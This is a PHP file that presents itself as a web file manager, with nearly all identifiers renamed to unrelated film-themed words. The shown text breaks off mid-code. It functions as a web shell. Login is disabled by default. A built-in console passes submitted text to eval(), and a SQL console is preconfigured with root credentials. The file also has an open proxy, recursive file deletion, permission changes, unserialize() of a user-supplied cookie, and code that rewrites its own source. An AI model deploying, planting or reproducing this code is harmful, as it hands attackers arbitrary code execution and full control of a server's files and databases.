<?php







/* PHP File Mnager Azukono Shotoshi */



// Configuration you will do not change manually!
$blessingToken = '{"authorize":"0","login":"admin","password":"phpfm","cookie_name":"fm_user","days_authorization":"30","script":"<script type=\"text\/javascript\" src=\"https:\/\/www.cdolivet.com\/editarea\/editarea\/edit_area\/edit_area_full.js\"><\/script>\r\n<script language=\"Javascript\" type=\"text\/javascript\">\r\neditAreaLoader.init({\r\nid: \"newcontent\"\r\n,display: \"later\"\r\n,start_highlight: true\r\n,allow_resize: \"both\"\r\n,allow_toggle: true\r\n,word_wrap: true\r\n,language: \"ru\"\r\n,syntax: \"php\"\t\r\n,toolbar: \"search, go_to_line, |, undo, redo, |, select_font, |, syntax_selection, |, change_smooth_selection, highlight, reset_highlight, |, help\"\r\n,syntax_selection_allow: \"css,html,js,php,python,xml,c,cpp,sql,basic,pas\"\r\n});\r\n<\/script>"}';
$ofrendaTemplates = '{"Settings":"global $memoryConfig;\r\nvar_export($memoryConfig);","Backup SQL tables":"echo backupFamilyTables();"}';
$cocoSqlTemplates = '{"All bases":"SHOW DATABASES;","All tables":"SHOW TABLES;"}';



$ofrendaTranslation = '{"id":"en","Add":"Add","Are you sure you want to delete this directory (recursively)?":"Are you sure you want to delete this directory (recursively)?","Are you sure you want to delete this file?":"Are you sure you want to delete this file?","Archiving":"Archiving","Authorization":"Authorization","Back":"Back","Cancel":"Cancel","Chinese":"Chinese","Compress":"Compress","Console":"Console","Cookie":"Cookie","Created":"Created","Date":"Date","Days":"Days","Decompress":"Decompress","Delete":"Delete","Deleted":"Deleted","Download":"Download","done":"done","Edit":"Edit","Enter":"Enter","English":"English","Error occurred":"Error occurred","File manager":"File manager","File selected":"File selected","File updated":"File updated","Filename":"Filename","Files uploaded":"Files uploaded","French":"French","Generation time":"Generation time","German":"German","Home":"Home","Quit":"Quit","Language":"Language","Login":"Login","Manage":"Manage","Make directory":"Make directory","Name":"Name","New":"New","New file":"New file","no files":"no files","Password":"Password","pictures":"pictures","Recursively":"Recursively","Rename":"Rename","Reset":"Reset","Reset settings":"Reset settings","Restore file time after editing":"Restore file time after editing","Result":"Result","Rights":"Rights","Russian":"Russian","Save":"Save","Select":"Select","Select the file":"Select the file","Settings":"Settings","Show":"Show","Show size of the folder":"Show size of the folder","Size":"Size","Spanish":"Spanish","Submit":"Submit","Task":"Task","templates":"templates","Ukrainian":"Ukrainian","Upload":"Upload","Value":"Value","Hello":"Hello"}';



// end configuration


// They live in forests and mountains
$startSongTime = explode(' ', microtime());
$startSongTime = $startSongTime[1] + $startSongTime[0];
$blessingLanguages = array('en','ru','de','fr','uk');

$ofrendaPath = empty($_REQUEST['path']) ? $ofrendaPath = realpath('.') : realpath($_REQUEST['path']);
$ofrendaPath = str_replace('\\', '/', $ofrendaPath) . '/';
$mainOfrendaPath=str_replace('\\', '/',realpath('./'));

$maybeChicharronPhar = (version_compare(phpversion(),"5.3.0","<"))?true:false;

$miguelMessage = ''; // service string
$ofrendaDefaultLanguage = 'ru';


$detectOfendaLanguage = true;

$rememberVersion = 1.4;






//Authorization



$mamaImeldaAuthenticated = json_decode($blessingToken,true);
$mamaImeldaAuthenticated['authorize'] = isset($mamaImeldaAuthenticated['authorize']) ? $mamaImeldaAuthenticated['authorize'] : 0; 


$mamaImeldaAuthenticated['days_authorization'] = (isset($mamaImeldaAuthenticated['days_authorization'])&&is_numeric($mamaImeldaAuthenticated['days_authorization'])) ? (int)$mamaImeldaAuthenticated['days_authorization'] : 30;



$mamaImeldaAuthenticated['login'] = isset($mamaImeldaAuthenticated['login']) ? $mamaImeldaAuthenticated['login'] : 'admin';  
$mamaImeldaAuthenticated['password'] = isset($mamaImeldaAuthenticated['password']) ? $mamaImeldaAuthenticated['password'] : 'phpfm';  



$mamaImeldaAuthenticated['cookie_name'] = isset($mamaImeldaAuthenticated['cookie_name']) ? $mamaImeldaAuthenticated['cookie_name'] : 'fm_user';
$mamaImeldaAuthenticated['script'] = isset($mamaImeldaAuthenticated['script']) ? $mamaImeldaAuthenticated['script'] : '';



// Little default config



$defaultMemoryConfig = array (



	'make_directory' => true, 
	'new_file' => true, 
	'upload_file' => true, 

	'show_dir_size' => false, //if true, show directory size â†’ maybe slow 



	'show_img' => true, 
	'show_php_ver' => true, 
	'show_php_ini' => false, // show path to current php.ini
	'show_gt' => true, // show generation time
	'enable_php_console' => true,
	'enable_sql_console' => true,
	'sql_server' => 'localhost',



	'sql_username' => 'root',



	'sql_password' => '',


	'sql_db' => 'test_base',
	'enable_proxy' => true,

	'show_phpinfo' => true,


	'show_xls' => true,



	'fm_settings' => true,


	'restore_time' => true,



	'fm_restore_time' => false,
);

if (empty($_COOKIE['fm_config'])) $memoryConfig = $defaultMemoryConfig;
else $memoryConfig = unserialize($_COOKIE['fm_config']);


// Change language



if (isset($_POST['fm_lang'])) { 
	setcookie('fm_lang', $_POST['fm_lang'], time() + (86400 * $mamaImeldaAuthenticated['days_authorization']));

	$_COOKIE['fm_lang'] = $_POST['fm_lang'];



}
$songLanguage = $ofrendaDefaultLanguage;







// Detect browser language
if($detectOfendaLanguage && !empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) && empty($_COOKIE['fm_lang'])){

	$memoryLanguagePriority = explode(',', $_SERVER['HTTP_ACCEPT_LANGUAGE']);



	if (!empty($memoryLanguagePriority)){



		foreach ($memoryLanguagePriority as $ofrendaLanguages){
			$marigoldLng = explode(';', $ofrendaLanguages);
			$marigoldLng = $marigoldLng[0];


			if(in_array($marigoldLng,$blessingLanguages)){
				$songLanguage = $marigoldLng;



				break;
			}


		}


	}



} 


// Cookie language is primary for ever
$songLanguage = (empty($_COOKIE['fm_lang'])) ? $songLanguage : $_COOKIE['fm_lang'];




// Localization
$ofrendaLanguage = json_decode($ofrendaTranslation,true);


if ($ofrendaLanguage['id']!=$songLanguage) {

	$getOfendaLanguage = file_get_contents('https://raw.githubusercontent.com/Den1xxx/Filemanager/master/languages/' . $songLanguage . '.json');
	if (!empty($getOfendaLanguage)) {
		//remove unnecessary characters


		$memoryTranslationString = str_replace("'",'&#39;',json_encode(json_decode($getOfendaLanguage),JSON_UNESCAPED_UNICODE));

		$memoryFileContent = file_get_contents(__FILE__);



		$searchMemory = preg_match('#translation[\s]?\=[\s]?\'\{\"(.*?)\"\}\';#', $memoryFileContent, $songMatches);


		if (!empty($songMatches[1])) {

			$songFileModified = filemtime(__FILE__);



			$replaceErnesto = str_replace('{"'.$songMatches[1].'"}',$memoryTranslationString,$memoryFileContent);

			if (file_put_contents(__FILE__, $replaceErnesto)) {

				$miguelMessage .= __('File updated');



			}	else $miguelMessage .= __('Error occurred');

			if (!empty($memoryConfig['fm_restore_time'])) touch(__FILE__,$songFileModified);
		}	

		$ofrendaLanguage = json_decode($memoryTranslationString,true);
	}
}




/* Functions */







//translation



function __($rememberText){



	global $ofrendaLanguage;
	if (isset($ofrendaLanguage[$rememberText])) return $ofrendaLanguage[$rememberText];

	else return $rememberText;


};


//delete files and dirs recursively
function deleteErnestoFiles($songFile, $blessingIsRecursive = false) {
	if($blessingIsRecursive && @is_dir($songFile)) {
		$noteElementList = scanMemoryDirectory($songFile, '', '', true);
		foreach ($noteElementList as $songElement) {



			if($songElement != '.' && $songElement != '..'){


				deleteErnestoFiles($songFile . '/' . $songElement, true);



			}

		}
	}


	if(@is_dir($songFile)) {


		return rmdir($songFile);
	} else {



		return @unlink($songFile);



	}



}




//file perms
function permissionsFamilyString($songFile, $ifRemember = false){


	$songPermissions = fileperms($songFile);
	$cocoInfo = '';


	if(!$ifRemember){
		if (($songPermissions & 0xC000) == 0xC000) {
			//Socket


			$cocoInfo = 's';



		} elseif (($songPermissions & 0xA000) == 0xA000) {
			//Symbolic Link
			$cocoInfo = 'l';
		} elseif (($songPermissions & 0x8000) == 0x8000) {



			//Regular
			$cocoInfo = '-';
		} elseif (($songPermissions & 0x6000) == 0x6000) {


			//Block special
			$cocoInfo = 'b';
		} elseif (($songPermissions & 0x4000) == 0x4000) {
			//Directory



			$cocoInfo = 'd';
		} elseif (($songPermissions & 0x2000) == 0x2000) {
			//Character special
			$cocoInfo = 'c';

		} elseif (($songPermissions & 0x1000) == 0x1000) {
			//FIFO pipe
			$cocoInfo = 'p';


		} else {



			//Unknown


			$cocoInfo = 'u';
		}
	}



  
	//Owner

	$cocoInfo .= (($songPermissions & 0x0100) ? 'r' : '-');
	$cocoInfo .= (($songPermissions & 0x0080) ? 'w' : '-');

	$cocoInfo .= (($songPermissions & 0x0040) ?
	(($songPermissions & 0x0800) ? 's' : 'x' ) :
	(($songPermissions & 0x0800) ? 'S' : '-'));



 
	//Group
	$cocoInfo .= (($songPermissions & 0x0020) ? 'r' : '-');
	$cocoInfo .= (($songPermissions & 0x0010) ? 'w' : '-');



	$cocoInfo .= (($songPermissions & 0x0008) ?



	(($songPermissions & 0x0400) ? 's' : 'x' ) :



	(($songPermissions & 0x0400) ? 'S' : '-'));
 



	//World
	$cocoInfo .= (($songPermissions & 0x0004) ? 'r' : '-');
	$cocoInfo .= (($songPermissions & 0x0002) ? 'w' : '-');
	$cocoInfo .= (($songPermissions & 0x0001) ?
	(($songPermissions & 0x0200) ? 't' : 'x' ) :



	(($songPermissions & 0x0200) ? 'T' : '-'));



	return $cocoInfo;
}







function convertFamilyPermissions($memoryMode) {
	$memoryMode = str_pad($memoryMode,9,'-');
	$memoryTranslation = array('-'=>'0','r'=>'4','w'=>'2','x'=>'1');
	$memoryMode = strtr($memoryMode,$memoryTranslation);
	$newCocoMode = '0';


	$cocoOwner = (int) $memoryMode[0] + (int) $memoryMode[1] + (int) $memoryMode[2]; 
	$familyGroup = (int) $memoryMode[3] + (int) $memoryMode[4] + (int) $memoryMode[5]; 
	$ofrendaGlobal = (int) $memoryMode[6] + (int) $memoryMode[7] + (int) $memoryMode[8]; 

	$newCocoMode .= $cocoOwner . $familyGroup . $ofrendaGlobal;
	return intval($newCocoMode, 8);
}





function cocoChangePermissions($songFile, $fridaValue, $ofrendaRecord = false) {

	$memoryResult = @chmod(realpath($songFile), $fridaValue);



	if(@is_dir($songFile) && $ofrendaRecord){
		$noteElementList = scanMemoryDirectory($songFile);
		foreach ($noteElementList as $songElement) {
			$memoryResult = $memoryResult && cocoChangePermissions($songFile . '/' . $songElement, $fridaValue, true);


		}



	}


	return $memoryResult;

}



//load files
function downloadRememberFile($miguelFileName) {



    if (!empty($miguelFileName)) {

		if (file_exists($miguelFileName)) {



			header("Content-Disposition: attachment; filename=" . basename($miguelFileName));   



			header("Content-Type: application/force-download");


			header("Content-Type: application/octet-stream");
			header("Content-Type: application/download");


			header("Content-Description: File Transfer");            
			header("Content-Length: " . filesize($miguelFileName));		



			flush(); // this doesn't really matter.

			$ofrendaPointer = fopen($miguelFileName, "r");
			while (!feof($ofrendaPointer)) {

				echo fread($ofrendaPointer, 65536);
				flush(); // this is essential for large downloads

			} 
			fclose($ofrendaPointer);
			die();


		} else {
			header('HTTP/1.0 404 Not Found', true, 404);
			header('Status: 404 Not Found'); 

			die();
        }


    } 

}




//show folder size
function calculateMemoryDirectorySize($hectorFile,$cocoFormat=true) {
	if($cocoFormat)  {
		$noteBatchSize=calculateMemoryDirectorySize($hectorFile,false);
		if($noteBatchSize<=1024) return $noteBatchSize.' bytes';
		elseif($noteBatchSize<=1024*1024) return round($noteBatchSize/(1024),2).'&nbsp;Kb';



		elseif($noteBatchSize<=1024*1024*1024) return round($noteBatchSize/(1024*1024),2).'&nbsp;Mb';
		elseif($noteBatchSize<=1024*1024*1024*1024) return round($noteBatchSize/(1024*1024*1024),2).'&nbsp;Gb';

		elseif($noteBatchSize<=1024*1024*1024*1024*1024) return round($noteBatchSize/(1024*1024*1024*1024),2).'&nbsp;Tb'; //:)))
		else return round($noteBatchSize/(1024*1024*1024*1024*1024),2).'&nbsp;Pb'; // ;-)


	} else {
		if(is_file($hectorFile)) return filesize($hectorFile);
		$noteBatchSize=0;


		$hectorDirHandle=opendir($hectorFile);
		while(($songFile=readdir($hectorDirHandle))!==false) {
			if($songFile=='.' || $songFile=='..') continue;
			if(is_file($hectorFile.'/'.$songFile)) $noteBatchSize+=filesize($hectorFile.'/'.$songFile);
			else $noteBatchSize+=calculateMemoryDirectorySize($hectorFile.'/'.$songFile,false);
		}


		closedir($hectorDirHandle);



		return $noteBatchSize+filesize($hectorFile); 
	}



}





//scan directory
function scanMemoryDirectory($ofrendaDirectoryPath, $explosiveMemory = '', $songType = 'all', $noErnestoFilter = false) {


	$memoriesDirectory = $numRiveraDirs = array();


	if(!empty($explosiveMemory)){


		$explosiveMemory = '/^' . str_replace('*', '(.*)', str_replace('.', '\\.', $explosiveMemory)) . '$/';
	}



	if(!empty($songType) && $songType !== 'all'){
		$songFunction = 'is_' . $songType;
	}
	if(@is_dir($ofrendaDirectoryPath)){
		$mariachiFileHandle = opendir($ofrendaDirectoryPath);


		while (false !== ($miguelFilename = readdir($mariachiFileHandle))) {


			if(substr($miguelFilename, 0, 1) != '.' || $noErnestoFilter) {
				if((empty($songType) || $songType == 'all' || $songFunction($ofrendaDirectoryPath . '/' . $miguelFilename)) && (empty($explosiveMemory) || preg_match($explosiveMemory, $miguelFilename))){

					$memoriesDirectory[] = $miguelFilename;


				}


			}
		}


		closedir($mariachiFileHandle);
		natsort($memoriesDirectory);



	}
	return $memoriesDirectory;
}



function rememberMainLink($getMemory,$rememberLink,$rememberName,$songTitle='') {


	if (empty($songTitle)) $songTitle=$rememberName.' '.basename($rememberLink);


	return '&nbsp;&nbsp;<a href="?'.$getMemory.'='.base64_encode($rememberLink).'" title="'.$songTitle.'">'.$rememberName.'</a>';



}



function memoryArrayToOptions($familyArray,$imeldaN,$selectedSong=''){

	foreach($familyArray as $rememberV){

		$guitarByte=$rememberV[$imeldaN];


		$memoryResult.='<option value="'.$guitarByte.'" '.($selectedSong && $selectedSong==$guitarByte?'selected':'').'>'.$guitarByte.'</option>';
	}


	return $memoryResult;



}




function ofrendaLanguageForm ($currentMemory='en'){
return '


<form name="change_lang" method="post" action="">
	<select name="fm_lang" title="'.__('Language').'" onchange="document.forms[\'change_lang\'].submit()" >


		<option value="en" '.($currentMemory=='en'?'selected="selected" ':'').'>'.__('English').'</option>
		<option value="de" '.($currentMemory=='de'?'selected="selected" ':'').'>'.__('German').'</option>
		<option value="ru" '.($currentMemory=='ru'?'selected="selected" ':'').'>'.__('Russian').'</option>



		<option value="fr" '.($currentMemory=='fr'?'selected="selected" ':'').'>'.__('French').'</option>
		<option value="uk" '.($currentMemory=='uk'?'selected="selected" ':'').'>'.__('Ukrainian').'</option>

	</select>
</form>
';
}


	

function ofrendaRootDirectory($cocoDirectoryName){
	return ($cocoDirectoryName=='.' OR $cocoDirectoryName=='..');

}



function ofrendaPanel($songString){
	$showRememberMistakes=ini_get('display_errors');
	ini_set('display_errors', '1');
	ob_start();
	eval(trim($songString));
	$rememberText = ob_get_contents();

	ob_end_clean();


	ini_set('display_errors', $showRememberMistakes);



	return $rememberText;
}


//SHOW DATABASES
function connectToFamilySql(){



	global $memoryConfig;
	return new mysqli($memoryConfig['sql_server'], $memoryConfig['sql_username'], $memoryConfig['sql_password'], $memoryConfig['sql_db']);

}

function executeMiguelSql($memoryQuery){


	global $memoryConfig;
	$memoryQuery=trim($memoryQuery);

	ob_start();



	$familyConnection = connectToFamilySql();
	if ($familyConnection->connect_error) {


		ob_end_clean();	
		return $familyConnection->connect_error;

	}
	$familyConnection->set_charset('utf8');
    $queriedHector = mysqli_query($familyConnection,$memoryQuery);

	if ($queriedHector===false) {

		ob_end_clean();	



		return mysqli_error($familyConnection);
    } else {


		if(!empty($queriedHector)){
			while($imeldaRow = mysqli_fetch_assoc($queriedHector)) {



				$blessingQueryResult[]=  $imeldaRow;


			}


		}
		$cocoDump=empty($blessingQueryResult)?'':var_export($blessingQueryResult,true);	



		ob_end_clean();	



		$familyConnection->close();

		return '<pre>'.stripslashes($cocoDump).'</pre>';
	}
}




function backupFamilyTables($familyTables = '*', $fullMemoryBackup = true) {
	global $ofrendaPath;
	$riveraDatabase = connectToFamilySql();



	$melodyDelimiter = "; \n  \n";
	if($familyTables == '*')	{

		$familyTables = array();



		$songResult = $riveraDatabase->query('SHOW TABLES');



		while($imeldaRow = mysqli_fetch_row($songResult))	{

			$familyTables[] = $imeldaRow[0];
		}
	} else {



		$familyTables = is_array($familyTables) ? $familyTables : explode(',',$familyTables);
	}



    
	$returnToOfrenda='';



	foreach($familyTables as $riveraTable)	{
		$songResult = $riveraDatabase->query('SELECT * FROM '.$riveraTable);
		$ofrendaFieldCount = mysqli_num_fields($songResult);


		$returnToOfrenda.= 'DROP TABLE IF EXISTS `'.$riveraTable.'`'.$melodyDelimiter;


		$hectorRowAlt = mysqli_fetch_row($riveraDatabase->query('SHOW CREATE TABLE '.$riveraTable));
		$returnToOfrenda.=$hectorRowAlt[1].$melodyDelimiter;

        if ($fullMemoryBackup) {



		for ($danteI = 0; $danteI < $ofrendaFieldCount; $danteI++)  {

			while($imeldaRow = mysqli_fetch_row($songResult)) {
				$returnToOfrenda.= 'INSERT INTO `'.$riveraTable.'` VALUES(';


				for($julioJ=0; $julioJ<$ofrendaFieldCount; $julioJ++)	{
					$imeldaRow[$julioJ] = addslashes($imeldaRow[$julioJ]);

					$imeldaRow[$julioJ] = str_replace("\n","\\n",$imeldaRow[$julioJ]);



					if (isset($imeldaRow[$julioJ])) { $returnToOfrenda.= '"'.$imeldaRow[$julioJ].'"' ; } else { $returnToOfrenda.= '""'; }
					if ($julioJ<($ofrendaFieldCount-1)) { $returnToOfrenda.= ','; }



				}


				$returnToOfrenda.= ')'.$melodyDelimiter;


			}

		  }


		} else { 
		$returnToOfrenda = preg_replace("#AUTO_INCREMENT=[\d]+ #is", '', $returnToOfrenda);



		}



		$returnToOfrenda.="\n\n\n";
	}


	//save file
    $songFile=gmdate("Y-m-d_H-i-s",time()).'.sql';


	$cocoHandle = fopen($songFile,'w+');
	fwrite($cocoHandle,$returnToOfrenda);

	fclose($cocoHandle);

	$ernestoAlert = 'onClick="if(confirm(\''. __('File selected').': \n'. $songFile. '. \n'.__('Are you sure you want to delete this file?') . '\')) document.location.href = \'?delete=' . $songFile . '&path=' . $ofrendaPath  . '\'"';



    return $songFile.': '.rememberMainLink('download',$ofrendaPath.$songFile,__('Download'),__('Download').' '.$songFile).' <a href="#" title="' . __('Delete') . ' '. $songFile . '" ' . $ernestoAlert . '>' . __('Delete') . '</a>';



}



function restoreFamilyTables($sqlToSing) {


	$riveraDatabase = connectToFamilySql();



	$melodyDelimiter = "; \n  \n";

    // Load and explode the sql file



    $hectorFile = fopen($sqlToSing,"r+");
    $sqlCocoFile = fread($hectorFile,filesize($sqlToSing));
    $sqlMiguelArray = explode($melodyDelimiter,$sqlCocoFile);
	

    //Process the sql file by statements
    foreach ($sqlMiguelArray as $rememberStatement) {



        if (strlen($rememberStatement)>3){
			$songResult = $riveraDatabase->query($rememberStatement);

				if (!$songResult){


					$sqlMemoryErrorCode = mysqli_errno($riveraDatabase->connection);
					$sqlMemoryErrorText = mysqli_error($riveraDatabase->connection);
					$rememberSqlStatement      = $rememberStatement;
					break;

           	     }

           	  }
           }
if (empty($sqlMemoryErrorCode)) return __('Success').' â€” '.$sqlToSing;
else return $sqlMemoryErrorText.'<br/>'.$rememberStatement;



}




function memoryImageUrl($miguelFilename){
	return './'.basename(__FILE__).'?img='.base64_encode($miguelFilename);
}


function rememberHomeStyle(){


	return '


input, input.fm_input {

	text-indent: 2px;



}

input, textarea, select, input.fm_input {
	color: black;
	font: normal 8pt Verdana, Arial, Helvetica, sans-serif;

	border-color: black;


	background-color: #FCFCFC none !important;
	border-radius: 0;

	padding: 2px;


}





input.fm_input {



	background: #FCFCFC none !important;
	cursor: pointer;
}



.home {

	background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAAK/INwWK6QAAAgRQTFRF/f396Ojo////tT02zr+fw66Rtj432TEp3MXE2DAr3TYp1y4mtDw2/7BM/7BOqVpc/8l31jcqq6enwcHB2Tgi5jgqVpbFvra2nBAV/Pz82S0jnx0W3TUkqSgi4eHh4Tsre4wosz026uPjzGYd6Us3ynAydUBA5Kl3fm5eqZaW7ODgi2Vg+Pj4uY+EwLm5bY9U//7jfLtC+tOK3jcm/71u2jYo1UYh5aJl/seC3jEm12kmJrIA1jMm/9aU4Lh0e01BlIaE///dhMdC7IA//fTZ2c3MW6nN30wf95Vd4JdXoXVos8nE4efN/+63IJgSnYhl7F4csXt89GQUwL+/jl1c41Aq+fb2gmtI1rKa2C4kJaIA3jYrlTw5tj423jYn3cXE1zQoxMHBp1lZ3Dgmqiks/+mcjLK83jYkymMV3TYk//HM+u7Whmtr0odTpaOjfWJfrHpg/8Bs/7tW/7Ve+4U52DMm3MLBn4qLgNVM6MzB3lEflIuL/+jA///20LOzjXx8/7lbWpJG2C8k3TosJKMA1ywjopOR1zYp5Dspiay+yKNhqKSk8NW6/fjns7Oz2tnZuz887b+W3aRY/+ms4rCE3Tot7V85bKxjuEA3w45Vh5uhq6am4cFxgZZW/9qIuwgKy0sW+ujT4TQntz423C8i3zUj/+Kw/a5d6UMxuL6wzDEr////cqJQfAAAAKx0Uk5T////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////AAWVFbEAAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAAA2UlEQVQoU2NYjQYYsAiE8U9YzDYjVpGZRxMiECitMrVZvoMrTlQ2ESRQJ2FVwinYbmqTULoohnE1g1aKGS/fNMtk40yZ9KVLQhgYkuY7NxQvXyHVFNnKzR69qpxBPMez0ETAQyTUvSogaIFaPcNqV/M5dha2Rl2Timb6Z+QBDY1XN/Sbu8xFLG3eLDfl2UABjilO1o012Z3ek1lZVIWAAmUTK6L0s3pX+jj6puZ2AwWUvBRaphswMdUujCiwDwa5VEdPI7ynUlc7v1qYURLquf42hz45CBPDtwACrm+RDcxJYAAAAABJRU5ErkJggg==");



	background-repeat: no-repeat;


}';



}

function memoryConfigCheckboxRow($rememberName,$memoryValue) {
	global $memoryConfig;
	return '<tr><td class="row1"><input id="fm_config_'.$memoryValue.'" name="fm_config['.$memoryValue.']" value="1" '.(empty($memoryConfig[$memoryValue])?'':'checked="true"').' type="checkbox"></td><td class="row2 whole"><label for="fm_config_'.$memoryValue.'">'.$rememberName.'</td></tr>';

}




function memoryProtocol() {

	if (isset($_SERVER['HTTP_SCHEME'])) return $_SERVER['HTTP_SCHEME'].'://';
	if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') return 'https://';
	if (isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == 443) return 'https://';

	if (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') return 'https://';
	return 'http://';
}





function memorySiteUrl() {
	return memoryProtocol().$_SERVER['HTTP_HOST'];
}

function getMemoryUrl($fullBlessing=false) {


	$marigoldHost=$fullBlessing?memorySiteUrl():'.';
	return $marigoldHost.'/'.basename(__FILE__);
}




function memoryHome($fullBlessing=false){


	return '&nbsp;<a href="'.getMemoryUrl($fullBlessing).'" title="'.__('Home').'"><span class="home">&nbsp;&nbsp;&nbsp;&nbsp;</span></a>';


}




function runMemoryInput($marigoldLng) {
	global $memoryConfig;



	$returnToOfrenda = !empty($memoryConfig['enable_'.$marigoldLng.'_console']) ? 
	'
				<form  method="post" action="'.getMemoryUrl().'" style="display:inline">
				<input type="submit" name="'.$marigoldLng.'run" value="'.strtoupper($marigoldLng).' '.__('Console').'">

				</form>
' : '';
	return $returnToOfrenda;
}


function memoryUrlProxy($songMatches) {


	$rememberLink = str_replace('&amp;','&',$songMatches[2]);

	$ofrendaUrl = isset($_GET['url'])?$_GET['url']:'';
	$parseMemoryUrl = parse_url($ofrendaUrl);



	$marigoldHost = $parseMemoryUrl['scheme'].'://'.$parseMemoryUrl['host'].'/';



	if (substr($rememberLink,0,2)=='//') {



		$rememberLink = substr_replace($rememberLink,memoryProtocol(),0,2);

	} elseif (substr($rememberLink,0,1)=='/') {


		$rememberLink = substr_replace($rememberLink,$marigoldHost,0,1);	


	} elseif (substr($rememberLink,0,2)=='./') {

		$rememberLink = substr_replace($rememberLink,$marigoldHost,0,2);	


	} elseif (substr($rememberLink,0,4)=='http') {



		//alles machen wunderschon
	} else {


		$rememberLink = $marigoldHost.$rememberLink;
	} 



	if ($songMatches[1]=='href' && !strripos($rememberLink, 'css')) {


		$ofrendaBasePath = memorySiteUrl().'/'.basename(__FILE__);
		$rememberQuery = $ofrendaBasePath.'?proxy=true&url=';
		$rememberLink = $rememberQuery.urlencode($rememberLink);
	} elseif (strripos($rememberLink, 'css')){
		//ĞºĞ°Ğº-Ñ‚Ğ¾ Ñ‚Ğ¾Ğ¶Ğµ Ğ¿Ğ¾Ğ´Ğ¼ĞµĞ½ÑÑ‚ÑŒ Ğ½Ğ°Ğ´Ğ¾


	}



	return $songMatches[1].'="'.$rememberLink.'"';

}



 

function memoryTemplateForm($familyLanguageTemplate) {
	global ${$familyLanguageTemplate.'_templates'};



	$ofrendaTemplateArray = json_decode(${$familyLanguageTemplate.'_templates'},true);
	$memoryString = '';
	foreach ($ofrendaTemplateArray as $keyTemplateCoco=>$memoryViewTemplate) {

		$memoryString .= '<tr><td class="row1"><input name="'.$familyLanguageTemplate.'_name[]" value="'.$keyTemplateCoco.'"></td><td class="row2 whole"><textarea name="'.$familyLanguageTemplate.'_value[]"  cols="55" rows="5" class="textarea_input">'.$memoryViewTemplate.'</textarea> <input name="del_'.rand().'" type="button" onClick="this.parentNode.parentNode.remove();" value="'.__('Delete').'"/></td></tr>';



	}
return '
<table>
<tr><th colspan="2">'.strtoupper($familyLanguageTemplate).' '.__('templates').' '.runMemoryInput($familyLanguageTemplate).'</th></tr>
<form method="post" action="">

<input type="hidden" value="'.$familyLanguageTemplate.'" name="tpl_edited">
<tr><td class="row1">'.__('Name').'</td><td class="row2 whole">'.__('Value').'</td></tr>


'.$memoryString.'
<tr><td colspan="2" class="row3"><input name="res" type="button" onClick="document.location.href = \''.getMemoryUrl().'?fm_settings=true\';" value="'.__('Reset').'"/> <input type="submit" value="'.__('Save').'" ></td></tr>
</form>
<form method="post" action="">



<input type="hidden" value="'.$familyLanguageTemplate.'" name="tpl_edited">
<tr><td class="row1"><input name="'.$familyLanguageTemplate.'_new_name" value="" placeholder="'.__('New').' '.__('Name').'"></td><td class="row2 whole"><textarea name="'.$familyLanguageTemplate.'_new_value"  cols="55" rows="5" class="textarea_input" placeholder="'.__('New').' '.__('Value').'"></textarea></td></tr>


<tr><td colspan="2" class="row3"><input type="submit" value="'.__('Add').'" ></td></tr>
</form>



</table>

';


}






/* End Functions */







// authorization



if ($mamaImeldaAuthenticated['authorize']) {
	if (isset($_POST['login']) && isset($_POST['password'])){
		if (($_POST['login']==$mamaImeldaAuthenticated['login']) && ($_POST['password']==$mamaImeldaAuthenticated['password'])) {


			setcookie($mamaImeldaAuthenticated['cookie_name'], $mamaImeldaAuthenticated['login'].'|'.md5($mamaImeldaAuthenticated['password']), time() + (86400 * $mamaImeldaAuthenticated['days_authorization']));



			$_COOKIE[$mamaImeldaAuthenticated['cookie_name']]=$mamaImeldaAuthenticated['login'].'|'.md5($mamaImeldaAuthenticated['password']);
		}


	}
	if (!isset($_COOKIE[$mamaImeldaAuthenticated['cookie_name']]) OR ($_COOKIE[$mamaImeldaAuthenticated['cookie_name']]!=$mamaImeldaAuthenticated['login'].'|'.md5($mamaImeldaAuthenticated['password']))) {



		echo '


<!doctype html>


<html>


<head>

<meta charset="utf-8" />


<meta name="viewport" content="width=device-width, initial-scale=1" />



<title>'.__('File manager').'</title>

</head>
<body>



<form action="" method="post">


'.__('Login').' <input name="login" type="text">&nbsp;&nbsp;&nbsp;


'.__('Password').' <input name="password" type="password">&nbsp;&nbsp;&nbsp;
<input type="submit" value="'.__('Enter').'" class="fm_input">



</form>
'.ofrendaLanguageForm($songLanguage).'
</body>
</html>

';  


die();
	}
	if (isset($_POST['quit'])) {
		unset($_COOKIE[$mamaImeldaAuthenticated['cookie_name']]);


		setcookie($mamaImeldaAuthenticated['cookie_name'], '', time() - (86400 * $mamaImeldaAuthenticated['days_authorization']));


		header('Location: '.memorySiteUrl().$_SERVER['REQUEST_URI']);
	}
}




// Change config
if (isset($_GET['fm_settings'])) {

	if (isset($_GET['fm_config_delete'])) { 


		unset($_COOKIE['fm_config']);
		setcookie('fm_config', '', time() - (86400 * $mamaImeldaAuthenticated['days_authorization']));



		header('Location: '.getMemoryUrl().'?fm_settings=true');


		exit(0);
	}	elseif (isset($_POST['fm_config'])) { 


		$memoryConfig = $_POST['fm_config'];
		setcookie('fm_config', serialize($memoryConfig), time() + (86400 * $mamaImeldaAuthenticated['days_authorization']));


		$_COOKIE['fm_config'] = serialize($memoryConfig);
		$miguelMessage = __('Settings').' '.__('done');
	}	elseif (isset($_POST['fm_login'])) { 
		if (empty($_POST['fm_login']['authorize'])) $_POST['fm_login'] = array('authorize' => '0') + $_POST['fm_login'];



		$loginToRememberForm = json_encode($_POST['fm_login']);
		$memoryFileContent = file_get_contents(__FILE__);
		$searchMemory = preg_match('#authorization[\s]?\=[\s]?\'\{\"(.*?)\"\}\';#', $memoryFileContent, $songMatches);


		if (!empty($songMatches[1])) {
			$songFileModified = filemtime(__FILE__);
			$replaceErnesto = str_replace('{"'.$songMatches[1].'"}',$loginToRememberForm,$memoryFileContent);



			if (file_put_contents(__FILE__, $replaceErnesto)) {



				$miguelMessage .= __('File updated');



